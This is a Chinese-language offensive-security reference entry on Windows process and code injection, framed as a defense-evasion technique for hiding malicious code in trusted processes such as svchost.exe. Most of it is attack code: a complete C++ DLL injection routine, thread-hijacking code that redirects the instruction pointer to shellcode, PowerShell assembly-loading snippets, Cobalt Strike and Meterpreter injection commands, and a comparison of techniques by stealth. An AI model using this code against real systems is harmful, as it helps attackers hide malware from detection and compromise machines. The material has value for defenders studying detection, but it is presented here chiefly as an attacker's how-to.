---
id: 08-002
title: "进程注入与代码注入 (Process Injection & Code Injection)"
category: 痕迹清除
category_en: "Covering Tracks"
difficulty: ★★★★
tools: "Cobalt Strike, Meterpreter, PowerSploit, Process Hollowing, APC"
last_updated: 2026-05
tags: ["covering-tracks", "anti-forensics", "process-injection", "obfuscation"]
subdomain: covering-tracks
nist_csf: ["DE.CM-01", "PR.PT-01"]
mitre_attack: ["T1070", "T1562", "T1055", "T1027"]
---
# 进程注入与代码注入 (Process Injection & Code Injection)

## 概述

进程注入是将恶意代码植入合法进程地址空间执行的技术，是防御规避的重要手段。通过将恶意代码隐藏在可信进程（如 explorer.exe、svchost.exe、notepad.exe）中，攻击者可以绕过应用白名单、逃避进程检测和网络监控。

## 核心技能

### 1. DLL 注入 (Classic DLL Injection)

```cpp
// DLL 注入核心代码 (C++)
#include <windows.h>
#include <tlhelp32.h>

BOOL InjectDLL(DWORD pid, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return FALSE;
    
    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1,
                                        MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteMem) { CloseHandle(hProcess); return FALSE; }
    
    WriteProcessMemory(hProcess, pRemoteMem, dllPath, strlen(dllPath) + 1, NULL);
    
    LPVOID pLoadLib = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                        (LPTHREAD_START_ROUTINE)pLoadLib, pRemoteMem, 0, NULL);
    if (!hThread) { CloseHandle(hProcess); return FALSE; }
    
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}

// PowerShell 版 DLL 注入
// $pid 为目标进程 PID
$bytes = [System.IO.File]::ReadAllBytes("C:\Path\To\payload.dll")
$proc = [System.Diagnostics.Process]::GetProcessById($pid)
$handle = $proc.Handle
```

### 2. 反射式 DLL 注入 (Reflective DLL Injection)

```cpp
// 反射式 DLL 注入 — 无需在磁盘上存在 DLL 文件
// DLL 自身实现加载逻辑，无需 LoadLibrary

// 核心步骤:
// 1. 将 DLL 的 raw bytes 复制到目标进程
// 2. 在目标进程中解析 DLL 的 PE 结构
// 3. 手动映射 DLL 到内存 (处理重定位、导入表)
// 4. 调用 DllMain

// Metasploit 的 Reflective DLL Injection 实现
// https://github.com/stephenfewer/ReflectiveDLLInjection

// 使用 Cobalt Strike 的反射式 DLL 加载:
// beacon> inject 1234 x64 C:\payload.dll
```

### 3. 进程镂空 (Process Hollowing)

```cpp
// 进程镂空核心步骤 (C++)
// 1. 以挂起方式创建合法进程
// 2. 卸载该进程的内存 (NtUnmapViewOfSection)
// 3. 在进程中分配新内存 (VirtualAllocEx)
// 4. 将恶意 PE 写入目标进程
// 5. 设置入口点 (SetThreadContext)
// 6. 恢复线程 (ResumeThread)

// PowerShell 简化示例
$proc = Start-Process -FilePath "C:\Windows\System32\svchost.exe" -WindowStyle Hidden -PassThru
# 挂起创建，替换内存，恢复执行

// Cobalt Strike 进程镂空:
beacon> inject 5678 x64 beacon.dll
```

### 4. APC 注入 (Asynchronous Procedure Call)

```cpp
// APC 注入 — 利用异步过程调用执行代码
// 1. 打开目标线程
// 2. 在目标进程中分配内存并写入 shellcode
// 3. 为每个目标线程排队 APC (QueueUserAPC)
// 4. 当线程进入可告警状态时执行 shellcode

// PowerSploit APC 注入
$code = @'
[DllImport("kernel32.dll")] public static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
[DllImport("kernel32.dll")] public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
'@

// Meterpreter APC 注入
meterpreter > post/windows/manage/reflective_dll_inject
```

### 5. 线程执行劫持 (Thread Execution Hijacking)

```cpp
// 线程执行劫持
// 1. 挂起目标线程 (SuspendThread)
// 2. 通过 SetThreadContext 修改 RIP/EIP 指向 shellcode
// 3. 恢复线程 (ResumeThread)

HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);
SuspendThread(hThread);

CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(hThread, &ctx);

// 修改指令指针指向 shellcode
#ifdef _WIN64
    ctx.Rip = (DWORD64)remoteShellcodeAddr;
#else
    ctx.Eip = (DWORD)remoteShellcodeAddr;
#endif

SetThreadContext(hThread, &ctx);
ResumeThread(hThread);
```

### 6. 其他注入技术

```powershell
# 额外窗口内存注入 (Extra Window Memory Injection)
# 利用 Windows 在额外窗口内存中存储指针的特性
# 通过 SetWindowLongPtr/GetWindowLongPtr 操作

# 原子表注入 (Atom Bombing)
# 利用 GlobalAddAtom/GlobalGetAtomName 在进程间传递 shellcode

# 注册表注入 (Registry Modification Injection)
# 将 shellcode 存储在注册表中，通过特定 trigger 执行

# .NET AppDomain 注入
# 在 .NET 进程中加载恶意程序集
$bytes = [System.IO.File]::ReadAllBytes("C:\Path\To\payload.exe")
[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, (, [string[]] (, $args)))
```

## 注入技术对比

| 技术 | 隐蔽性 | 实施难度 | Win10/11 兼容 | 检测难度 |
|:---|:---:|:---:|:---:|:---:|
| DLL 注入 | 低 | 低 | ✅ | 低 |
| 反射式 DLL 注入 | 中 | 中 | ✅ | 中 |
| 进程镂空 | 高 | 高 | ✅ | 中 |
| APC 注入 | 高 | 中 | ✅ | 高 |
| 线程劫持 | 中 | 中 | ✅ | 中 |
| Atom Bombing | 高 | 高 | ✅ | 高 |

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| Cobalt Strike | 进程注入、Malleable C2 | https://www.cobaltstrike.com/ |
| Metasploit | 多种注入模块 | https://www.metasploit.com/ |
| PowerSploit | PowerShell 注入库 | https://github.com/PowerShellMafia/PowerSploit |
| Process Hacker | 进程/线程查看工具 | https://processhacker.sourceforge.io/ |
| API Monitor | API 调用监控 | https://www.rohitab.com/apimonitor |

## 参考资源

- [MITRE ATT&CK — Process Injection (T1055)](https://attack.mitre.org/techniques/T1055/)
- [Windows Process Injection Techniques](https://www.elastic.co/blog/ten-process-injection-techniques-elken)
- [ired.team — Process Injection](https://www.ired.team/offensive-security/code-injection-process-injection)
- [HackTricks — Process Injection](https://book.hacktricks.xyz/windows-hardening/process-injection)
- [MalwareTech — Process Injection Explained](https://www.malwaretech.com/)
